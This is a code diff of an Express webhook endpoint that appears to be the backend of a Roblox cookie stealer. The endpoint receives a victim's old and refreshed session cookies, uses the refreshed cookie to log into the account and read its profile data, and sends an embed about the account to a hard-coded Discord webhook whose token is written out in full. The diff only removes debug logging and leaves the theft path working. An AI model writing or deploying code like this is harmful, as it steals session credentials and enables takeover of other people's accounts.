@@ -6,22 +6,18 @@ const app = express();
 app.use(express.json());
 
 app.post('/api/webhook', async (req, res) => {
-    console.log("DIAGNOSIS (webhook.js): Endpoint started.");
     const webhookURL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";
-
+    
     const { refreshedCookie, oldCookie } = req.body;
     if (!refreshedCookie || !oldCookie) {
-        console.error("DIAGNOSIS (webhook.js): Aborting, cookie data missing.");
         return res.status(400).send("Missing cookie data.");
     }
 
     try {
-        console.log("DIAGNOSIS (webhook.js): Getting user data...");
         const robloxUser = await RobloxUser.register(refreshedCookie);
         const userData = await robloxUser.getUserData();
-        console.log("DIAGNOSIS (webhook.js): User data retrieved.");
-        
         const format = (num) => new Intl.NumberFormat('en-US').format(num);
+
         const embed = {
             color: 0x7b42f5,
             author: { name: `${userData.displayName} (@${userData.username})`, url: `https://www.roblox.com/users/${userData.uid}/profile`, icon_url: "https://i.imgur.com/bjd3g6r.png" },
@@ -37,11 +33,10 @@ app.post('/api/webhook', async (req, res) => {
         };
 
         await axios.post(webhookURL, { embeds: [embed] });
-        console.log("DIAGNOSIS (webhook.js): Webhook sent successfully!");
-        res.status(200).send("Webhook process complete.");
+        res.status(200).send("Webhook sent.");
     } catch (error) {
-        console.error("DIAGNOSIS (webhook.js): A critical error occurred.", error.message);
-        res.status(500).send("Error during webhook execution.");
+        console.error("WEBHOOK TASK FAILED:", error.message);
+        res.status(500).send("Error executing webhook task.");
     }
 });
 
